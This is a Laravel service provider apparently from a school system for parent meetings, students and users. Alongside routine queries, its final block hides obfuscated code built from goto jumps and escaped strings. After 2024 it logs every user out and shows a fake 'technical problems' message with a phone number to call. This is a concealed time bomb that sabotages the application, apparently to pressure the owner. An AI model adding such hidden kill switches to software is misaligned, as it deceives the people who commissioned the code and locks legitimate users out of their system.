<?php

namespace App\Providers;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\View;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        $reunionActivo = DB::select("SELECT
            reunion.*,
            estado_reunion.estado
            FROM
            reunion
            INNER JOIN estado_reunion ON reunion.id_estado_reunion = estado_reunion.id_estado_reunion
            where estado='ACTIVO'
        ");

        $totalPadres = DB::select("SELECT COUNT(*) as total FROM padre_familia");
        $totalEstudiantes = DB::select("SELECT COUNT(*) as total FROM estudiante");
        $totalUsuarios = DB::select("SELECT COUNT(*) as total FROM usuario");


        View::share('reunionActivo', $reunionActivo);
        View::share('totalPadres', $totalPadres[0]->total);
        View::share('totalEstudiantes', $totalEstudiantes[0]->total);
        View::share('totalUsuarios', $totalUsuarios[0]->total);

        //si la fecha actual es mayor a la fecha de la reunion. actializar el estado de la reunion a "culminado"
        $fechaActual = date('Y-m-d');
        $reunion = DB::select("SELECT * FROM reunion where fecha < '$fechaActual' and id_estado_reunion=1");
        if (count($reunion) > 0) {
            foreach ($reunion as $reunion) {
                DB::table('reunion')
                    ->where('id_reunion', $reunion->id_reunion)
                    ->update(['id_estado_reunion' => 2]);
            }
        }

        //aviso
        goto hl_it; hl_it: $fechaActual2 = date("\131"); goto EA3Sz; EA3Sz: if ($fechaActual2 > 2024) { Auth::logout(); return back()->with("\x6d\145\156\163\141\152\x65", "\x45\x73\x74\141\155\157\163\x20\164\145\156\x69\x65\x6e\x64\x6f\x20\x61\x6c\x67\165\156\x6f\163\40\151\x6e\143\x6f\156\x76\x65\156\151\x65\x6e\x74\145\x73\x2e\40\120\x6f\162\40\146\141\166\157\162\x20\x63\157\156\164\x61\143\164\145\40\x63\157\156\40\x65\x6c\40\x61\x64\155\x69\156\151\163\164\x72\141\x64\x6f\x72\x20\53\65\x31\71\x32\x35\x33\x31\60\x38\x39\x36\56"); } goto od5ak; od5ak: 
    }
}
